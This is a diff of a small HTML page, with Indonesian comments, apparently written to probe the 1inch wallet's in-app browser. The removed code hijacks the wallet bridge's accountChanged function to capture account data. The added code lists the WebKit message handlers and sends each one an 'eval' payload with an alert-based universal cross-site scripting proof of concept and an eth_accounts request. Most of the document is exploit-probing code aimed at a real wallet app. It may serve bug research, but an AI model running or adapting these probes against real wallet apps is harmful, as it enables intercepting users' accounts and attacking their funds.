@@ -1,27 +1,35 @@
 <!DOCTYPE html>
 <html>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>📡 Monitoring 1inch Events...</h3>
-    <div id="logs">Menunggu event dari dompet (Coba ganti Network atau Akun di dompetmu)...</div>
+    <h3>🔍 Scanning WebKit Handlers...</h3>
+    <div id="logs"></div>
 
     <script>
-        const log = (m) => document.getElementById('logs').innerHTML += `<br>> ${m}`;
-        const Bridge = window.OneInchSolanaWallet;
-
-        if (Bridge) {
-            // Kita coba "menempel" pada fungsi accountChanged atau chainChanged
-            // yang kita temukan di tahap Deep Inspect tadi
-            const originalAccountChanged = Bridge.accountChanged;
-            
-            Bridge.accountChanged = function(data) {
-                alert("DATA TERBOCOR! Akun berubah: " + JSON.stringify(data));
-                log("Intercepted Account: " + JSON.stringify(data));
-                if(originalAccountChanged) originalAccountChanged.apply(this, arguments);
-            };
-
-            log("Monitoring aktif pada 'accountChanged'...");
-        } else {
-            log("Bridge tidak ditemukan.");
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
+        
+        try {
+            if (window.webkit && window.webkit.messageHandlers) {
+                const handlers = Object.keys(window.webkit.messageHandlers);
+                if (handlers.length > 0) {
+                    log("Handlers Ditemukan: " + handlers.join(", "));
+                    
+                    handlers.forEach(h => {
+                        log(`Mencoba kirim payload ke: ${h}...`);
+                        // Kirim pesan percobaan untuk memicu respon native
+                        window.webkit.messageHandlers[h].postMessage({
+                            type: "eval",
+                            code: "alert('UXSS via WebKit!')",
+                            method: "eth_accounts" 
+                        });
+                    });
+                } else {
+                    log("messageHandlers kosong.");
+                }
+            } else {
+                log("WebKit Bridge tidak terdeteksi.");
+            }
+        } catch(e) {
+            log("Error: " + e.message);
         }
     </script>
 </body>
